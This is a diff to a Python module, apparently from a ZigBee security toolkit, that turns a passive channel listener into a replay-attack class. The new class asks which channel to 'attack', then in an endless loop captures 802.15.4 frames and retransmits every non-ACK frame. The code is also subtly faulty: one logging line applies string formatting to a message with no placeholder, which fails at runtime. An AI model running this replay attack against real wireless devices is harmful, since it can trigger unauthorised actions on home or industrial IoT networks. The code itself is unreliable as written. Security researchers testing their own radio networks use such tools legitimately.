@@ -1,14 +1,12 @@
 #!/usr/bin/env python
 
 from zigdiggity.interface.console import print_notify
+from zigdiggity.packets.dot15d4 import is_ack
 from PyInquirer import prompt
 from zigdiggity.misc.utils import NumberValidator
-from zigdiggity.observers.stdout_observer import StdoutObserver
-import zigdiggity.observers.utils as observer_utils
-from zigdiggity.interface.console import print_notify
 
 
-class ListenProg():
+class ReplayAttack():
     def __init__(self, radio):
         self.radio = radio
 
@@ -16,7 +14,7 @@ class ListenProg():
         channelAns = prompt([{
             'type': 'input',
             'name': 'channel',
-            'message': 'Which channel would you like to use?',
+            'message': 'Which channel would you like to attack?',
             'validate': NumberValidator,
             'filter': lambda val: int(val)
         }])
@@ -29,19 +27,17 @@ class ListenProg():
         # if args.wireshark:
         #     observer_utils.register_wireshark(radio)
         #     print_notify("Registered Wireshark Observer")
-        # if args.stdout:
-        #     observer_utils.register_stdout(radio)
-        #     print_notify("Registered Stdout Observer")
 
         self.radio.set_channel(channel)
 
         print_notify("Listening to channel %d" % self.radio.get_channel())
 
-        stdout = StdoutObserver()
-        self.radio.add_receive_observer(stdout)
-        print_notify("Registered Stdout Observer")
+        interrupted = False
 
         while True:
-            self.result = self.radio.receive()
-
+            frame = self.radio.receive()
+            if not is_ack(frame):
+                self.radio.send(frame)
+                print_notify("Replayed packet frame..." %
+                             self.radio.get_channel())
         return True
